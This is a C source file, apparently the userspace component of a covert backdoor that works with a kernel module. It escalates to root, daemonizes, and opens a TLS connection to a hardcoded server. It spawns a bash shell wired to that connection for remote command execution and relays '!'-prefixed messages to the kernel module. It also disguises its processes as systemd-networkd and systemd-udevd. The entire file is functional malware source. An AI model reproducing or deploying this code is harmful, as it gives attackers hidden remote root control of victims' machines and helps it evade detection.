/*
 * Author and Designer: John Agapeyev
 * Date: 2018-10-19
 * Notes:
 * The socket handling for userspace
 */

#include <asm/types.h>
#include <assert.h>
#include <linux/tcp.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/fcntl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

#include "crypto.h"
#include "shared.h"

static unsigned char secret_key[KEY_LEN];
#ifndef UNIX_SOCK_PATH
#define UNIX_SOCK_PATH ("/var/run/covert_module_tls")
#endif
#ifndef SHELL_SOCK_PATH
#define SHELL_SOCK_PATH ("/var/run/my_remote_shell")
#endif

/*
 * function:
 *    wrapped_fork
 *
 * return:
 *    pid_t
 *
 * parameters:
 *    void
 *
 * notes:
 * Simple wrapper around fork call
 */
pid_t wrapped_fork(void) {
    pid_t pid;
    if ((pid = fork()) == -1) {
        perror("fork()");
        exit(EXIT_FAILURE);
    }
    return pid;
}

/*
 * function:
 *    run_remote_shell
 *
 * return:
 *    void
 *
 * parameters:
 *    void
 *
 * notes:
 * Connects to unix socket, and establishes it as input for standard streams before execing bash
 */
void run_remote_shell(void) {
    int remote_sock = socket(AF_UNIX, SOCK_STREAM, 0);

    struct sockaddr_un su;
    memset(&su, 0, sizeof(struct sockaddr_un));
    su.sun_family = AF_UNIX;
    strcpy(su.sun_path, SHELL_SOCK_PATH);

    errno = 0;

    if (connect(remote_sock, (struct sockaddr*) &su, sizeof(struct sockaddr_un))) {
        perror("connect");
        printf("%d\n", errno);
        exit(EXIT_FAILURE);
    }
    printf("connect %d\n", remote_sock);

    printf("shell running\n");

    if (wrapped_fork()) {
        exit(EXIT_SUCCESS);
    }
    setsid();

    dup2(remote_sock, 0);
    dup2(remote_sock, 1);
    dup2(remote_sock, 2);

    const char* sh[2];
    sh[0] = "/bin/bash";
    sh[1] = NULL;

    execve(sh[0], (char* const*) sh, 0);
}

/*
 * function:
 *    create_unix_socket
 *
 * return:
 *    int
 *
 * parameters:
 *    const char* sock_path
 *
 * notes:
 * Creates a unix socket based on a path
 */
int create_unix_socket(const char* sock_path) {
    int local_tls_socket = socket(AF_UNIX, SOCK_STREAM, 0);

    struct sockaddr_un su;
    memset(&su, 0, sizeof(struct sockaddr_un));
    su.sun_family = AF_UNIX;
    strcpy(su.sun_path, sock_path);

    unlink(sock_path);
    if (bind(local_tls_socket, (struct sockaddr*) &su, sizeof(struct sockaddr_un)) == -1) {
        perror("bind");
        return EXIT_FAILURE;
    }
    return local_tls_socket;
}

/*
 * function:
 *    create_remote_socket
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Creates a remote socket and connects it to the server
 */
int create_remote_socket(void) {
    int remote_sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in sin;
    sin.sin_addr.s_addr = SERVER_IP;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);

    if (connect(remote_sock, (struct sockaddr*) &sin, sizeof(struct sockaddr_in))) {
        perror("connect");
        return EXIT_FAILURE;
    }
    return remote_sock;
}

/*
 * function:
 *    mask_process
 *
 * return:
 *    void
 *
 * parameters:
 *    char** argv
 *    const char* process_mask
 *
 * notes:
 * Masks a process by a given mask by modifying argv[0]
 */
void mask_process(char** argv, const char* process_mask) {
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], process_mask);
    prctl(PR_SET_NAME, process_mask, 0, 0);
}

/*
 * function:
 *    createEpollFd
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Wrapper around epoll_create1()
 */
int createEpollFd(void) {
    int efd;
    if ((efd = epoll_create1(0)) == -1) {
        perror("epoll_create1");
        exit(EXIT_FAILURE);
    }
    return efd;
}

/*
 * function:
 *    add_epoll_socket
 *
 * return:
 *    void
 *
 * parameters:
 *    const int epollfd
 *    const int sock
 *    struct epoll_event* ev
 *
 * notes:
 * Wrapper around epoll_ctl
 */
void add_epoll_socket(const int epollfd, const int sock, struct epoll_event* ev) {
    if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, ev) == -1) {
        perror("epoll_ctl");
        exit(EXIT_FAILURE);
    }
}

/*
 * function:
 *    waitForEpollEvent
 *
 * return:
 *    int
 *
 * parameters:
 *    const int epollfd
 *    struct epoll_event* events
 *
 * notes:
 * Wrapper around epoll_wait
 */
int waitForEpollEvent(const int epollfd, struct epoll_event* events) {
    int nevents;
    if ((nevents = epoll_wait(epollfd, events, 100, -1)) == -1) {
        if (errno == EINTR) {
            //Interrupted by signal, ignore it
            return 0;
        }
        perror("epoll_wait");
        exit(EXIT_FAILURE);
    }
    return nevents;
}

/*
 * function:
 *    main
 *
 * return:
 *    int
 *
 * parameters:
 *    int argc
 *    char** argv
 *
 * notes:
 * Establishes a TLS session, forks into read and write processes, and forwards packets
 */
int main(int argc, char** argv) {
    (void)argc;
    const char* mask_1 = "/usr/lib/systemd/systemd-networkd";
    const char* mask_2 = "/usr/lib/systemd/systemd-udevd";
    if (setuid(0)) {
        perror("setuid");
        exit(EXIT_FAILURE);
    }
    if (setgid(0)) {
        perror("setgid");
        exit(EXIT_FAILURE);
    }

    //Daemonize
    if (wrapped_fork()) {
        return EXIT_SUCCESS;
    }
    setsid();

    memset(secret_key, 0xab, KEY_LEN);

    init_openssl();
    SSL_CTX* ctx = create_context();
    configure_context(ctx);

    int local_tls_socket = create_unix_socket(UNIX_SOCK_PATH);
    int remote_shell_unix = create_unix_socket(SHELL_SOCK_PATH);

    listen(local_tls_socket, 5);
    listen(remote_shell_unix, 5);

    int conn_sock = accept(local_tls_socket, NULL, 0);
    fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK);

    int remote_sock = create_remote_socket();

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, remote_sock);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
        return EXIT_FAILURE;
    }

    unsigned char buffer[MAX_PAYLOAD];
    int remote_shell_sock = -1;

    if (!wrapped_fork()) {
        run_remote_shell();
    } else {
        if (wrapped_fork()) {
            return EXIT_SUCCESS;
        }
        setsid();
        remote_shell_sock = accept(remote_shell_unix, NULL, 0);
        fcntl(remote_shell_sock, F_SETFL, fcntl(remote_shell_sock, F_GETFL, 0) | O_NONBLOCK);
        printf("accept %d\n", remote_shell_sock);
    }

    if (wrapped_fork()) {
        return EXIT_SUCCESS;
    }
    setsid();
    if (!wrapped_fork()) {
        if (wrapped_fork()) {
            return EXIT_SUCCESS;
        }
        setsid();
        mask_process(argv, mask_1);

        int efd = createEpollFd();
        struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));

        struct epoll_event ev;
        ev.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
        ev.data.fd = conn_sock;
        add_epoll_socket(efd, conn_sock, &ev);
        struct epoll_event eve;
        eve.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
        eve.data.fd = remote_shell_sock;
        add_epoll_socket(efd, remote_shell_sock, &eve);

        for (;;) {
            int n = waitForEpollEvent(efd, eventList);
            //n can't be -1 because the handling for that is done in waitForEpollEvent
            assert(n != -1);
            for (int i = 0; i < n; ++i) {
                if (eventList[i].events & EPOLLERR || eventList[i].events & EPOLLHUP) {
                    fprintf(stderr, "Sock error\n");
                    close(eventList[i].data.fd);
                } else if (eventList[i].events & EPOLLIN) {
                    int size;
                    while ((size = read(eventList[i].data.fd, buffer, MAX_PAYLOAD)) > 0) {
                        printf("Read %d bytes\n", size);
                        printf("Wrote %d bytes to server\n", size);
                        SSL_write(ssl, buffer, size);
                    }
                    if (size == 0) {
                        goto done;
                    }
                    if (size == -1) {
                        if (errno != EAGAIN) {
                            perror("read");
                            goto done;
                        }
                    }
                }
            }
        }
    done:
        free(eventList);
    } else {
        setsid();
        mask_process(argv, mask_2);
        //Read
        for (;;) {
            int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
            printf("Read %d from server\n", size);
            if (size < 0) {
                perror("SSL_read");
                break;
            } else if (size == 0) {
                break;
            }
            if (buffer[0] == '!') {
                printf("Wrote %d to kernel module\n", size);
                write(conn_sock, buffer + 1, size - 1);
            } else {
                printf("Wrote %d to remote shell\n", size);
                //Pass message to shell process
                write(remote_shell_sock, buffer, size);
            }
            memset(buffer, 0, MAX_PAYLOAD);
        }
    }

    puts("Userspace process exited\n");
    close(conn_sock);
    close(remote_shell_sock);

    close(local_tls_socket);
    close(remote_shell_unix);

    unlink(UNIX_SOCK_PATH);
    unlink(SHELL_SOCK_PATH);

    SSL_free(ssl);

    close(remote_sock);

    SSL_CTX_free(ctx);

    cleanup_openssl();

    return EXIT_SUCCESS;
}
